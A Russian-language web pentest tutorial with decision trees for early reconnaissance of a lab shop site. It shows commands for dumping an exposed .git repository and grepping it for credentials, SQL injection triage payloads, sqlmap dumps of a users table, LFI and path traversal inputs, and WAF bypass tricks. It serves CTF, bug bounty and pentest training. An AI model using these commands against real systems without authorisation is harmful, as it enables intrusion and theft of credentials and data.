## Задача

У тебя один URL — `https://shop.target.local`. Больше ничего. Задача — как можно дешевле найти **первый foothold**: креды, утечку исходников или точку инъекции. Разведка веб-приложения — это не «запустить сканер», а **последовательность дешёвых проверок, каждая из которых либо даёт foothold, либо закрывает ветку**.

Ошибка в порядке действий стоит дороже всего: час на SQLi, когда доступ лежал в `/.git/config`; остановка на «сервер вернул 500», хотя это была инъекция. Этот урок — два дерева решений раннего этапа.

## Данные, с которыми работаем

Одна цель `https://shop.target.local` и один запрос, который мы будем триажить: `GET /product?id=1`.

## Принципы раннего этапа

1. **Сначала дешёвое, потом дорогое.** `robots.txt`, `.git`, дефолтные креды, Swagger — секунды; time-based SQLi, брутфорс, OOB — минуты и шум.
2. **Один шаг — один артефакт.** Каждая проверка заканчивается либо доказательством, либо записанным отрицательным результатом.
3. **Дерево, а не список.** На каждом узле — условие ветвления. Нет движения за N попыток — возврат на уровень выше.

## Дерево 1: от URL до первого foothold

| Шаг | Команда | Условие ветвления |
|-----|---------|-------------------|
| Стек и версии | `httpx -u https://t -sc -td -server` | версия → CVE-ветка |
| robots/sitemap | `curl -s https://t/robots.txt` | скрытые пути → дискавери |
| Открытые артефакты | `curl -sI https://t/.git/HEAD` | 200 → дамп репозитория |
| Конфиги | `curl -sI https://t/.env` | 200 → креды/ключи |
| API-доки | `curl -s https://t/openapi.json` | 200 → карта эндпоинтов |
| Админка | `curl -sI https://t/admin` | 200/401/403 → auth-ветка |

«Низковисящие фрукты» одним проходом:

```bash
$ httpx -u https://shop.target.local -sc -title -server -tech-detect
https://shop.target.local [200] [Shop] [nginx/1.18.0] [PHP/7.4, MySQL]

$ curl -so /dev/null -w '%{http_code} .git\n' https://shop.target.local/.git/HEAD
200 .git
```

`.git` открыт — дампаем весь репозиторий и ищем секреты:

```bash
$ git-dumper https://shop.target.local/.git/ ./repo >/dev/null 2>&1
$ grep -rniE 'db_pass|password|api[_-]?key' repo/
repo/config.php:$db_pass = 'S3cr3tP@ss';
```

Foothold получен **без единого payload'а** — из утёкшего исходника. Именно поэтому дешёвые ветки идут первыми.

## Дерево 2: триаж подозрительной инъекции

Точка входа — сигнал: эхо кавычки, ошибка БД, задержка. **Сначала классифицируй, потом пиши payload.**

```bash
$ curl -s "https://shop.target.local/product?id=1"            | wc -c
4821
$ curl -s "https://shop.target.local/product?id=1'"           | wc -c
0
$ curl -s "https://shop.target.local/product?id=1 AND 1=1-- -" | wc -c
4821
$ curl -s "https://shop.target.local/product?id=1 AND 1=2-- -" | wc -c
0
```

Условия перехода:

- **Размер true ≠ false** → boolean-based blind; извлекай побайтово или отдай `sqlmap`.
- **Есть текст ошибки** → error/union; пробуй `UNION SELECT NULL,NULL`.
- **Время выросло ровно на N сек** → time-based blind.
- **Ничего не изменилось** → фильтр или другой контекст: `0x27`, `char(39)`, `%27`.

```bash
# time-based: не зависит от размера ответа
$ curl -s -o /dev/null -w '%{time_total}\n' \
  "https://shop.target.local/product?id=1; SELECT SLEEP(5)-- -"
5.02
```

Автоматизация подтверждённого кандидата (запрос сохраняем из Burp через *Copy as cURL*):

```bash
$ sqlmap -r request.txt -p id --batch --level=3 --risk=2 --technique=BEUT
$ sqlmap -r request.txt -p id --batch --dbs
available databases [3]:
[*] information_schema
[*] shop
[*] mysql
```

## Как читать дерево решений

Дерево решений — это не алгоритм, который гарантированно приведёт к цели. Это способ не потеряться. На каждом узле ты отвечаешь на один вопрос и получаешь ровно два исхода: идти дальше по ветке или вернуться. Умение работать с деревом — это умение вовремя вернуться.

Разберём на примере дерева 2. Ты нашёл параметр `id` и видишь, что `1'` ломает ответ. Первый вопрос: изменился ли размер ответа на `1=1` против `1=2`? Если да — boolean-blind, и дальше ты извлекаешь данные побайтово. Если нет — смотришь на время. Если время выросло ровно на задержку — time-based. Если не выросло ни то, ни другое — ты ещё не там: возможно, фильтр съел кавычку или параметр не доходит до запроса.

Ключевое правило: **одно наблюдение закрывает одну ветку**. Не нужно проверять все техники подряд «на всякий случай». Как только boolean подтверждён, time-based и error-based тебе уже не нужны — ты идёшь по найденной ветке. Это экономит и время, и шум в логах.

Второе правило — фиксировать отрицательный результат. «Проверил `/.env` — 404» это не потраченное время, а закрытая ветка. Без такой записи ты через двадцать минут снова потянешься к `.env`, потому что забудешь, что уже проверял. Дерево растёт из наблюдений, а не из списка команд.

Третье — не смешивать уровни. Если ты уже углубился в SQLi и извлекаешь данные, не бросайся параллельно в XSS только потому, что увидел отражение. Отражение — это отдельный узел, и к нему можно вернуться, когда закончишь с текущей веткой. Метание между ветками — главная причина, по которой разведка не заканчивается результатом.

Наконец, помни, что дерево может быть неполным. Если все ветки закрыты, а foothold нет — это сигнал не «сдаться», а «я плохо знаю приложение». Возвращайся к сбору информации: JS-бандлы, старые версии в архивах, заголовки, ошибки сервера. Новые входы откроют новые ветки.

И последнее: дерево — это ещё и способ общения. Когда ты передаёшь находку коллеге или в отчёт, последовательность «вот наблюдение — вот ветка — вот доказательство» понятна без пояснений. Список команд без условий ветвления такой ясности не даёт: читатель не понимает, почему выбрана именно эта проверка. Дерево фиксирует логику, а не только результат, и это экономит время и тебе при возврате к цели, и тому, кто продолжит с твоей точки.

## Полный прогон от URL до дампа

1. `httpx -td` → стек `PHP 7.4 / MySQL`.
2. `curl /.git/HEAD` → `200` → `git-dumper` → `db_pass = 'S3cr3tP@ss'`.
3. `?id=1` → триаж → boolean-blind подтверждён (`1=1` vs `1=2`).
4. `sqlmap -r request.txt -p id --dbs` → база `shop`.
5. `sqlmap ... -D shop -T users -C user,password --dump` → артефакт.

Маршрут закрыт: есть и креды из репозитория, и дамп из БД.

## Выбор между ветками

| Наблюдение | Ветка | Первый шаг |
|-----------|-------|-----------|
| `/.git/HEAD` = 200 | утечка исходников | `git-dumper` |
| Ошибка БД в ответе | SQLi error-based | `UNION SELECT` / `sqlmap` |
| Размер true ≠ false | boolean-blind | побайтовое извлечение |
| Ответ тот же, время растёт | time-based | побайтовое извлечение |
| Параметр `url=`/`file=` | SSRF / LFI | `http://127.0.0.1`, `../../../etc/passwd` |
| JWT в cookie | JWT-ветка | `jwt_tool -M at` |
| `Server: Apache/2.4.49` | path traversal CVE | `/.%2e/` |
| Параметр отражается в HTML | XSS | контекст + `dalfox` |

## Работа с параметрами и контекстом

Один payload ведёт себя по-разному в query, JSON, заголовке, cookie и multipart — проверяй **все** точки входа:

```bash
$ curl -s "https://t/s?q=test'"                                      # query
$ curl -s https://t/api -H 'Content-Type: application/json' -d '{"q":"test'"'"'"}'  # JSON
$ curl -s https://t/ -H "X-Forwarded-For: 127.0.0.1'"                # заголовок
$ curl -s https://t/ -b "role=user'"                                # cookie
```

Скрытые параметры ищут `arjun` или `ffuf`: `arjun -u https://target.local/api/item --get`.

## Если не сработало (типичные тупики)

- **Фильтр кавычки.** Пробуй `0x27`, `char(39)`, `%27`, `%2527`, юникод.
- **WAF на `SELECT`/`UNION`.** Регистр `SeLeCt`, комментарии `/**/`, `+`, `%09`.
- **Пустой ответ на ошибку.** Переходи на boolean/time — они не зависят от вывода.
- **Ничего не видно.** OOB-канал (DNS/HTTP) или побочные эффекты (кэш, логи).
- **Один метод ≠ весь класс.** Не сработал UNION — пробуй error/boolean/time/OOB.

## Что мы теперь знаем

- Порядок раннего этапа: стек → артефакты (`.git`, `.env`) → доки → админка → дискавери.
- Утёкшие исходники и конфиги часто дают foothold дешевле любой инъекции.
- Триаж инъекции — это классификация (boolean/error/time), а не сразу payload.
- Подозрение становится находкой только после воспроизводимого PoC.
- Отрицательный результат тоже фиксируется — он закрывает ветку.

## На что смотреть дальше

- **Журнал.** Вектор → команда → результат; без него повторишь тупик.
- **Учёт словарей.** Не гоняй один список по одному `host:port` дважды.
- **Версии под CVE.** `nuclei` запускай рано — он закрывает «известное».
- **Контекст.** `0x27` и `char(39)` обходят фильтр кавычки.
- **Pivot.** Найденные креды БД — вход к данным, а не финал.

## Куда дальше

Дальше (`web-playbook-recon-to-foothold`) мы подробно разберём первое дерево — от URL до подтверждённого вектора. А пока главное запомни: дешёвые ветки (`.git`, `.env`, доки, дефолты) проверяются до единого payload'а.

## Где пригодится

- **CTF (Web):** порядок «сначала дешёвое» экономит время и не даёт застрять.
- **Bug bounty:** быстрый триаж инъекций и артефакты для отчёта.
- **Пентест:** стандартный маршрут раннего этапа с фиксацией тупиков.
- **Работа (SOC/AppSec):** понимание типовых переходов помогает при триаже.
